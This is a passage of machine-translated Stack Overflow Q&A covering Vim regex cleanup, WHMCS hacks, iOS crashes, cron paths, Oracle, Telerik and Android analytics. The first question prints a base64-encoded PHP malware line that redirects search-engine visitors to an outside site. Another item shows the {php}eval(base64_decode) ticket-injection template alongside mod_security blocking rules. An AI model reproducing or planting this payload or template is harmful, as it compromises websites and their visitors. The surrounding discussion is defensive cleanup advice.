eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9ydW56b3IuZG5zcmQuY29tLyIpOw0KZXhpdCgpOw0KfQp9Cn0NCn0NCn0=")); 
```

我打开 VIM 并尝试运行 a`0,$s/eval(.+;//gc`以尝试删除它的所有实例，但 VIM 说找不到模式。正确的表达方式是什么？

注释 - 根据我的评论，我也尝试过`0,$s/eval\(.+;//gc`VIM 抱怨`E54: Unmatched \( E476: Invalid command`

我也试过`0,$s/eval\(.\+;//gc`了，又得到了`E54: Unmatched \( E476: Invalid command`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-22T14:12:56.750

在 Vim 中，与大多数其他地方不同，某些元字符必须转义才能用作元字符，而不是转义为文字。因此，您需要转义`+`为`\+`匹配*前面的一个或多个*.

```
0,$s/eval(.\+;//gc 
```

以上内容已经过测试并与您的 PHP 代码段一起使用。

*编辑：对不起 - 以前的版本有一个错误的`\(`地方`(`应该不作为文字转义。*

# php - WHMCS 被 {php} 和 Eval base64 代码通过票证入侵

> ID：13514295
> 
> 赞同：2
> 
> 时间：2012-11-22T13:59:05.083
> 
> 标签：php, apache, smarty, whmcs, mod-security2

WHMCS 使用 Smarty 作为它的模板系统，虽然一个很棒的模板系统它有一个缺陷，即`{php}`标签。这些标签允许 smarty 直接在模板中解释 PHP 代码，或者在这种情况下，在创建新工单时通过工单系统解释。这种 hack 一直发生在 WHMCS 系统中，您可以尝试通过配置中的阻止文本选项来阻止 WHMCS 中的代码。但大多数时候这不起作用。

发生的情况是 WHMCS 接受了票，并且黑客在票消息中添加了以下内容：

```
{php}eval(base64_decode(encoded message));{\php} 
```

如此聪明的人看到了这个`{php}`部分，立即让 PHP 运行该命令。所以它首先对base64编码的PHP进行解码。这将带出一些黑客试图运行的 PHP 函数/脚本。

然后 eval 接管并实际评估 PHP 代码并在服务器端运行它。

许多黑客采用这种方式，他们运行他们知道可以在 WHMCS 中运行的代码，然后获取数据库信息并将其回显到文件中。然后他们只是通过浏览器 URL 抓取这个文件并获得他们想要的信息。

这仅适用于某些 WHMCS 安装，尽管 WHMCS 表示最新版本不允许这样做，并且在 Smarty 中禁用了 {php}，有时黑客确实会找到一种方法来绕过它和`eval`他们的代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:28:46.150

[Smarty 配置中有一个标志来启用/禁用 this](http://www.smarty.net/docs/en/advanced.features.tpl) ，默认情况下它应该是***关闭的。***

如果`{php}`WHMCS 要求使用标签，那么他们 [尽可能礼貌地说] 令人难以置信的智障，应该退出制作账单或任何其他软件的业务。

编辑：是的，[就在他们的文档](http://docs.whmcs.com/Template_Syntax#Using_PHP_Code_within_Templates)中。“你看！我们特意为你打开了这个*超级*巨无霸的安全漏洞！”

您可能希望通过 grep 浏览您的模板文件来查找这些`{php}`标签的任何用法，因为它表明您将通过堵住这个安全漏洞而失去任何功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T13:59:05.083

这实际上是使用 mod_security 修复的一个非常简单的 hack。首先找到您的 mod_security 配置文件所在的位置，这完全取决于您安装的 mod_security 和操作系统，但它通常称为`modsec.conf`or `modsec2.conf`，有时`security.conf`但很少。

您可以`locate`在大多数 linux 系统上使用该命令（如果已安装）找到它。

```
sudo updatedb
locate modsec.conf
or
locate modsec2.conf 
```

如果您`locate`不需要进入`/`目录并直接运行`find`，这将需要一些时间，但有时面板会将其安装在奇怪的地方，而不仅仅是`/etc`.

```
cd /
find . -type f -iname 'modsec*.conf' 
```

无论哪种方式都可以找到配置文件。找到后，使用您喜欢的编辑器编辑文件并转到最底部并添加以下内容：

```
SecRuleEngine On    
SecRule ARGS {php} "severity:4,log,deny"
SecRule ARGS eval "severity:4,log,deny"
SecRule ARGS base64_decode "severity:4,log,deny" 
```

基本上你告诉它在`GET`和中过滤参数`POST`。就是这样，现在重新启动apache：

```
CentOS:
service httpd restart

Ubuntu:
service apache2 restart 
```

现在您可能会认为这会阻止您在脚本中使用这些命令，而不是完全不会。这只阻止那些单词被发送到`GET`or `POST`。如果有人尝试他们会得到一个`Not Acceptable`错误，它根本不起作用。

这使您不必从防火墙或 WHMCS 和潜在客户中阻止一堆 IP。

# iphone - iOS 6 地图偶尔崩溃

> ID：13514296
> 
> 赞同：11
> 
> 时间：2012-11-22T13:59:05.890
> 
> 标签：iphone, ios, ios6, ios6-maps

我偶尔会在使用 iOS 6 MapKit 时崩溃。无法真正重现。什么会导致这种情况？

```
Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x00000044
Crashed Thread:  0

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   IMGSGX543GLDriver               0x38f231b4 sgxTextureGetImageRowBytes(GLDTextureRec*, unsigned int, unsigned int) + 8
1   IMGSGX543GLDriver               0x38f23160 CalculateChunkPlaneSizes(GLDTextureRec*, int, unsigned int*, unsigned int*, unsigned int*, unsigned int*) + 104
2   IMGSGX543GLDriver               0x38f25906 sgxConfigureTexturePrivate(GLDTextureRec*) + 82
3   IMGSGX543GLDriver               0x38f24584 glrUpdateTexture + 616
4   libGPUSupportMercury.dylib      0x342c76b6 gldLoadFramebuffer + 102
5   GLEngine                        0x31b50e52 gleUpdateDrawFramebufferState + 178
6   GLEngine                        0x31b52556 gleDoDrawDispatchCoreES2 + 126
7   GLEngine                        0x31aedbc0 gleDrawArraysOrElements_Entries_Body + 140
8   GLEngine                        0x31aea5ec glDrawArrays_ES2Exec + 160
9   VectorKit                       0x3780dcd6 -[VKSkyModel drawScene:withContext:] + 326
10  VectorKit                       0x377e76d6 -[VKModelObject recursiveDrawScene:whenReadyWithContext:] + 118
11  VectorKit                       0x377621ea -[VKMapModel recursiveDrawScene:withContext:] + 278
12  VectorKit                       0x37762096 -[VKModelObject recursiveDrawScene:withContext:] + 186
13  VectorKit                       0x3775d4da -[VKScreenCanvas onTimerFired:] + 1014
14  VectorKit                       0x3775b548 -[VKMapCanvas onTimerFired:] + 500
15  VectorKit                       0x3775a3d2 -[VKMainLoop displayTimerFired:] + 610
16  QuartzCore                      0x3095b06c CA::Display::DisplayLink::dispatch(unsigned long long, unsigned long long) + 156
17  QuartzCore                      0x3095afc4 CA::Display::IOMFBDisplayLink::callback(__IOMobileFramebuffer*, unsigned long long, unsigned long long, unsigned long long, void*) + 60
18  IOMobileFramebuffer             0x331e4fd4 IOMobileFramebufferVsyncNotifyFunc + 152
19  IOKit                           0x36fc4446 IODispatchCalloutFromCFMessage + 190
20  CoreFoundation                  0x382a95d8 __CFMachPortPerform + 116
21  CoreFoundation                  0x382b4170 __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 32
22  CoreFoundation                  0x382b4112 __CFRunLoopDoSource1 + 134
23  CoreFoundation                  0x382b2f94 __CFRunLoopRun + 1380
24  CoreFoundation                  0x38225eb8 CFRunLoopRunSpecific + 352
25  CoreFoundation                  0x38225d44 CFRunLoopRunInMode + 100
26  GraphicsServices                0x3415f2e6 GSEventRunModal + 70
27  UIKit                           0x351b72fc UIApplicationMain + 1116
28  MyApp                           0x0005d78a main (main.m:14)
29  MyApp                           0x0005d744 start + 36 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T13:39:15.767

我实际上发现了iOS版本的问题。用户在 iPad 4、iOS 6.1.2 上运行，一旦我升级到 6.1.3，问题就消失了。希望这可以帮助某人。

谢谢，蒂姆

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-24T10:26:06.813

我找到了这个。它可以帮助您解决问题。

“问题：基于 OpenGL ES 的应用程序在调用 presentRenderBuffer 后显示“闪烁”或“陈旧”帧。当 OpenGL ES 应用程序调用 EAGL presentRenderbuffer 方法而未先绘制任何内容时，可能会出现此症状。屏幕上看到的内容可能包含未初始化的像素或先前渲染的帧。要纠正此问题，您应该始终在调用 presentRenderbuffer 之前向帧缓冲区绘制一些内容。另请注意，除非您在 CAEAGLLayer 上设置 RetainedBackbuffer 属性以启用保留后缓冲模式，否则无法保证渲染缓冲区的内容在调用 presentRenderbuffer 后保持有效”。

-刘易斯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-15T16:42:26.743

我刚刚在我的 iPad 上测试了一个应用程序。它总是在模拟器和设备上运行没有问题，但刚才它在同一点崩溃并出现相同的错误。

这是我的方法 - 显示用户位置且没有注释的非常简单的地图：

```
- (void)mapView:(MKMapView *)mapView regionDidChangeAnimated:(BOOL)animated {
    MKCoordinateSpan span = self.mapView.region.span;
    zoomLevel = span.latitudeDelta;
       shouldAdjustZoom = NO;
} 
```

这是崩溃日志

```
Incident Identifier: 01AE9C88-1F56-44D4-92A1-C6B5938DEBD4
CrashReporter Key:   f372f86613043286b74e70a8d1f9d7b1b5313cf5
Hardware Model:      iPad3,4
Process:         MyApp [1247]
Path:            /var/mobile/Applications/C39AEC49-8DB1-45DE-B175-A6AEC19D533F/MyApp.app/MyApp
Identifier:      MyApp
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2013-07-15 08:25:16.390 +0200
OS Version:      iOS 6.1.3 (10B329)
Report Version:  104

Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x00000044
Crashed Thread:  0

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   IMGSGX554GLDriver               0x32ea6be0 0x32e99000 + 56288
1   IMGSGX554GLDriver               0x32ea6b8e 0x32e99000 + 56206
2   IMGSGX554GLDriver               0x32ea92f2 0x32e99000 + 66290
3   IMGSGX554GLDriver               0x32ea7f44 0x32e99000 + 61252 
```

我结束了在设备后台运行的一大堆应用程序（主要是儿童游戏）并重新启动它，然后它运行良好。也许可以帮助某人查明确切的问题以及我们的应用程序中的任何更改是否可以防止崩溃。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-15T07:26:06.240

我遇到了这个确切的问题，结果证明是与内存压力相关的崩溃。当地图在第四次或第五次显示时出现黑色背景而不是任何瓷砖或网格背景时，我一直在崩溃。这发生在 iOS 6.0 和 6.1 以及 7.0 测试版上。

我的带有地图视图的视图控制器在从导航堆栈中删除后没有被释放，并且它对将其保存在内存中的地图视图有很强的引用。

修复我的泄漏后，问题就消失了。

# php - 从 cron 运行时包含相关文件

> ID：13514301
> 
> 赞同：1
> 
> 时间：2012-11-22T13:59:14.227
> 
> 标签：php, cron, command-line-interface

考虑一个简单的 PHP 脚本：

```
$ pwd
/var/www/site/public_html

$ cat a.php
#!/usr/bin/php -q
<?php
echo "a: ".getcwd();
require_once('b.php');
?>

$ cat b.php
<?php
echo "b: ".getcwd();
?>

$ ./a.php > output
$ cat output
a: /var/www/site/public_html
b: /var/www/site/public_html 
```

然后我设置了一个简单的 cron 作业：

```
* * * * * /var/www/site/public_html/a.php > /var/www/site/public_html/output 
```

但是，这是 cron 运行后的输出：

```
$ cat output
a: /home/user 
```

路径已更改，并且 require 函数无法再找到要包含的脚本。令人沮丧的是，我有另一台服务器，cron 作业确实保留了它的路径。我已经完成了配置选项，但无法弄清楚如何配置 PHP 以保持原始路径，即使作为 cron 作业运行也是如此。这是怎么做到的？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T14:02:29.523

尝试这个

```
$fileRoot = dirname(__FILE__);
require_once($fileRoot.DIRECTORY_SEPARATOR.'b.php'); 
/* considering b.php is in same directory */ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:07:27.803

在您的 cron 命令中，您可以将脚本设置为在指定的工作目录中运行：

```
cd /var/www/site/public_html && ./a.php > output 
```

# oracle - Oracle 在同一事务期间访问更新的记录

> ID：13514303
> 
> 赞同：0
> 
> 时间：2012-11-22T13:59:24.703
> 
> 标签：oracle, transactions

使用 Oracle 10g

是否可以在提交之前在同一事务中获取新更新字段的值。

我正在执行一个调用 2 个其他存储过程的存储过程。

第一个存储过程从表中获取记录，然后更新该记录。

第二个存储过程获取相同的记录，但需要使用第一个存储过程中新更新的字段。

然后执行提交。

只有在两个过程都成功执行的情况下才能完成提交。

第二个存储过程会获得新更新的数据，还是会获得第一个过程中返回的相同数据的副本而没有更新？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T05:22:15.403

Oracle 有一个非常简单和健壮的读一致性实现：

*   用户看到最新版本的数据，包括当前事务所做的任何更改，但是......
*   在其他用户发出提交之前，用户无法看到任何其他用户所做的更改，即便如此，直到执行新语句时才能看到。

这在《概念指南》中有介绍。 [了解更多](http://docs.oracle.com/cd/B19306_01/server.102/b14220/consist.htm#sthref1925)。

# telerik - 将 OpenAccess 域模型添加到 silverlight 应用程序时出现问题

> ID：13514309
> 
> 赞同：0
> 
> 时间：2012-11-22T13:59:31.783
> 
> 标签：telerik, silverlight-5.0, telerik-open-access

这是我的第一个 Silverlight 应用程序，我正在尝试使用 Telerik 的 ORM 进行一些数据绑定。

当我尝试添加域模型（或 EF5 数据模型）时，我总是会收到错误消息

```
Compiling transformation: Metadata file 'Microsoft.VisualStudio.TextTemplating.Modeling.11.0.dll' could not be found 
```

我试图添加对该程序集的引用，但找不到它；我用 Visual Studio 11 和 silverlight 5 运行 Windows 7 64 位机器。

当我尝试打开生成的文件（具有 *.cs 和 *.rlinq.diagram 的 *.rlinq 文件）时，它们没有任何导入、使用、组装或类似的东西：

*cs 文件只有字符串 ErrorGeneratingOutput

另一个有

```
<?xml version="1.0" encoding="utf-8"?>
<entityDiagramsDiagram dslVersion="2.0.0.0" absoluteBounds="0, 0, 11, 12.375" name="EntityDiagrams1">
  <DomainModelMoniker name="/EntityDiagrams" />
  <nestedChildShapes>
    <classShape Id="c29d1b99-187c-4f74-8450-dfedbee61921" absoluteBounds="0.75, 1.875, 1.5, 2.1473746744791669" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/UserGroups" />
      <nestedChildShapes>
        <elementListCompartment Id="704aa5b8-74f2-443b-995e-1a0c601f8219" absoluteBounds="0.765, 2.385, 1.4700000000000002, 0.8262939453125" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="820c2771-dbf2-4f42-a9a7-aec3ba5df7d4" absoluteBounds="0.765, 3.2212939453125, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="8a50ba0f-43ef-457d-95d5-5764eaa01379" absoluteBounds="0.765, 3.4806835937500002, 1.4700000000000002, 0.44169108072916674" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="accfcac1-cb17-4e9c-b8c8-4eb0deca766d" absoluteBounds="3.75, 0.75, 1.5, 2.3396761067708329" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/UserAttendants" />
      <nestedChildShapes>
        <elementListCompartment Id="dcda1f6d-1d49-4789-8461-73ba0b3050f6" absoluteBounds="3.765, 1.2599999999999998, 1.4700000000000002, 0.8262939453125" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="7b8da440-ed63-406c-a2ec-93777658fe4b" absoluteBounds="3.765, 2.0962939453124996, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="ffbf24f1-93ff-481c-aa7e-b0a5c7c83c1d" absoluteBounds="3.765, 2.3556835937500002, 1.4700000000000002, 0.63399251302083326" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="55e0a6e0-5c20-4ba2-9a31-26e8d5a08f04" absoluteBounds="6, 9.375, 1.5, 2.7242789713541669" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/Users" />
      <nestedChildShapes>
        <elementListCompartment Id="51edae1f-5776-4916-9512-7de25f9e2cdd" absoluteBounds="6.015, 9.885, 1.4700000000000002, 1.4031982421875" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="433da401-adc9-4ad6-95cb-e00f2c40f731" absoluteBounds="6.015, 11.2981982421875, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="8c906d26-5a0d-4e4e-b81e-76a7eb878344" absoluteBounds="6.015, 11.557587890625, 1.4700000000000002, 0.44169108072916652" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" absoluteBounds="6, 3.5, 1.5, 4.8395947265625" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/TeamEvents" />
      <nestedChildShapes>
        <elementListCompartment Id="257a2039-b72c-479d-a831-77f2e9d97414" absoluteBounds="6.0150000000000006, 4.01, 1.4700000000000002, 2.5570068359375" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="8b17a7ab-af5d-462a-b3fa-e0f9282c867e" absoluteBounds="6.0150000000000006, 6.5770068359375, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="ea5fe5b2-a5f7-495f-812d-674baa6fc7f9" absoluteBounds="6.0150000000000006, 6.8363964843749994, 1.4700000000000002, 1.4031982421875" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="293c8000-fa45-46fe-ac76-ac95e5322451" absoluteBounds="0.75, 4.75, 1.5, 2.3396761067708329" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/GroupAttendants" />
      <nestedChildShapes>
        <elementListCompartment Id="46cf471d-673c-4e91-a602-465e8565aa91" absoluteBounds="0.76500000000000012, 5.26, 1.4700000000000002, 0.8262939453125" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="bf0582ab-1dcd-4335-9e92-e62b04cab919" absoluteBounds="0.76500000000000012, 6.0962939453125, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="a746ad03-204c-4914-a825-06c82d380c9c" absoluteBounds="0.76500000000000012, 6.35568359375, 1.4700000000000002, 0.63399251302083326" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="d354c37c-69e7-4815-89b4-ce5a8228dbc3" absoluteBounds="3, 4.75, 1.5, 2.3396761067708329" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/Groups" />
      <nestedChildShapes>
        <elementListCompartment Id="c5691c86-3585-43e0-af96-29dd5ca34369" absoluteBounds="3.0149999999999997, 5.26, 1.4700000000000002, 0.8262939453125" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="3833477d-ff2b-4e1d-86dc-48a461b9611c" absoluteBounds="3.0149999999999997, 6.0962939453125, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="814e3238-3cc6-4e53-9b66-93017c87f2a7" absoluteBounds="3.0149999999999997, 6.35568359375, 1.4700000000000002, 0.63399251302083326" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="1fa0ffc8-851d-414b-8c9c-23953349b73c" absoluteBounds="8.25, 3.5, 1.5, 2.1473746744791669" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/EventTypes" />
      <nestedChildShapes>
        <elementListCompartment Id="ce6f6ffa-b9e2-41d3-b20e-8f7e84b674b8" absoluteBounds="8.265, 4.01, 1.4700000000000002, 0.8262939453125" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="52c2feb7-7c6f-4526-b1b6-5fc03a3fcd48" absoluteBounds="8.265, 4.8462939453125, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="652a57eb-ea5f-4fc8-b24d-3325df489c32" absoluteBounds="8.265, 5.10568359375, 1.4700000000000002, 0.44169108072916674" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <classShape Id="9dc6ebbd-b634-4c22-b521-32ddf694dfe0" absoluteBounds="8.25, 6.375, 1.5, 1.9550732421875" fillColor="225, 249, 128, 67" outlineColor="213, 71, 0" textColor="White">
      <DomainClassMoniker name="/EntityDiagrams/EventLocations" />
      <nestedChildShapes>
        <elementListCompartment Id="29d5627b-5e61-4e38-9d93-d46e7db93ce9" absoluteBounds="8.265, 6.885, 1.4700000000000002, 0.63399251302083326" name="AttributesCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="b3af0ed9-1faa-40a7-988c-493f44f16636" absoluteBounds="8.265, 7.5289925130208335, 1.4700000000000002, 0.2493896484375" name="ImplementationsCompartment" titleTextColor="Black" itemTextColor="Black" />
        <elementListCompartment Id="3110f146-8957-4587-8ee2-d2a7fc2e62d9" absoluteBounds="8.265, 7.7883821614583333, 1.4700000000000002, 0.44169108072916652" name="NavigationCompartment" titleTextColor="Black" itemTextColor="Black" />
      </nestedChildShapes>
    </classShape>
    <associationConnector edgePoints="[(2.25 : 3.587275390625); (3.34375 : 3.587275390625); (3.34375 : 4.75)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="6744534d-057c-43fa-ab27-e85960bb25de" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="c29d1b99-187c-4f74-8450-dfedbee61921" />
        <classShapeMoniker Id="d354c37c-69e7-4815-89b4-ce5a8228dbc3" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(5.25 : 1.91983805338542); (6.75 : 1.91983805338542); (6.75 : 3.5)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="37b107df-2f1f-4a81-a2f4-6617a15cce0a" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="accfcac1-cb17-4e9c-b8c8-4eb0deca766d" />
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(4.90625 : 3.08967610677083); (4.90625 : 10.7371394856771); (6 : 10.7371394856771)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="c6256d1c-6cb2-4a57-873b-4001184ff6a2" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="accfcac1-cb17-4e9c-b8c8-4eb0deca766d" />
        <classShapeMoniker Id="55e0a6e0-5c20-4ba2-9a31-26e8d5a08f04" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(7.5 : 7.35253662109375); (8.25 : 7.35253662109375)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="93f4858e-6685-4f69-9005-9a8ae86c6ad7" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
        <classShapeMoniker Id="9dc6ebbd-b634-4c22-b521-32ddf694dfe0" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(7.5 : 4.57368733723958); (8.25 : 4.57368733723958)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="94a809bd-0d55-4d97-bb0b-4a1db01d67c8" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
        <classShapeMoniker Id="1fa0ffc8-851d-414b-8c9c-23953349b73c" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(6.53192307692308 : 8.3395947265625); (6.53192307692308 : 8.5895947265625); (6.97846153846154 : 8.5895947265625); (6.97846153846154 : 8.3395947265625)]" fixedFrom="NotFixed" fixedTo="NotFixed">
      <AssociationMoniker Id="4bd6231c-14e5-4782-8826-d318a28b87e9" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(2.25 : 5.91983805338542); (3 : 5.91983805338542)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="909045cd-67e3-4d3c-8a28-365a92f28f61" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="293c8000-fa45-46fe-ac76-ac95e5322451" />
        <classShapeMoniker Id="d354c37c-69e7-4815-89b4-ce5a8228dbc3" />
      </nodes>
    </associationConnector>
    <associationConnector edgePoints="[(1.5 : 7.08967610677083); (1.5 : 7.71463591666667); (4.82291666666667 : 7.71463591666666 : JumpStart); (4.98958333333333 : 7.71463591666667 : JumpEnd); (6 : 7.71463591666667)]" fixedFrom="Algorithm" fixedTo="Algorithm">
      <AssociationMoniker Id="af22af49-aa92-4f26-8bcd-ee099bc70e25" />
      <relativeChildShapes />
      <nodes>
        <classShapeMoniker Id="293c8000-fa45-46fe-ac76-ac95e5322451" />
        <classShapeMoniker Id="f6fa927f-8a05-4130-bb21-320d987aa5ae" />
      </nodes>
    </associationConnector>
  </nestedChildShapes>
</entityDiagramsDiagram> 
```

我该怎么办？

我在创建解决方案时启用了 RIA 服务

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T16:55:51.090

您不能在 Silverlight 应用程序中添加域模型。您可以做的是创建一个单独的类库，其中包含您的[模型](http://www.telerik.com/help/openaccess-orm/quickstart-silverlight-three-data-domain-model.html)。

# android - 为什么我看不到我从移动谷歌分析发送的事件？

> ID：13514311
> 
> 赞同：0
> 
> 时间：2012-11-22T13:59:38.937
> 
> 标签：android, google-analytics

我使用此代码（这是示例中的标准代码）：

protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState);

```
tracker = GoogleAnalyticsTracker.getInstance();

// Start the tracker in manual dispatch mode...
tracker.startNewSession("UA-36435865-1", 10, this);
tracker.setDebug(true);

// ...alternatively, the tracker can be started with a dispatch interval (in seconds).
//tracker.startNewSession("UA-YOUR-ACCOUNT-HERE", 20, this);

setContentView(R.layout.main);
Button createEventButton = (Button)findViewById(R.id.NewEventButton);
createEventButton.setOnClickListener(new OnClickListener() {
  @Override
  public void onClick(View v) {
    tracker.trackEvent(
        "Clicks",  // Category
        "Button",  // Action
        "clicked", // Label
        77);       // Value
  }
});

Button createPageButton = (Button)findViewById(R.id.NewPageButton);
createPageButton.setOnClickListener(new OnClickListener() {
  @Override
  public void onClick(View v) {
    // Add a Custom Variable to this pageview, with name of "Medium" and value "MobileApp"
    tracker.setCustomVar(1, "Medium", "Mobile App");
    // Track a page view. This is probably the best way to track which parts of your application
    // are being used.
    // E.g.
    // tracker.trackPageView("/help"); to track someone looking at the help screen.
    // tracker.trackPageView("/level2"); to track someone reaching level 2 in a game.
    // tracker.trackPageView("/uploadScreen"); to track someone using an upload screen.
    tracker.trackPageView("/testApplicationHomeScreen");
  }
});

Button quitButton = (Button)findViewById(R.id.QuitButton);
quitButton.setOnClickListener(new OnClickListener() {
  @Override
  public void onClick(View v) {
    finish();
  }
});

Button dispatchButton = (Button)findViewById(R.id.DispatchButton);
dispatchButton.setOnClickListener(new OnClickListener() {
  @Override
  public void onClick(View v) {
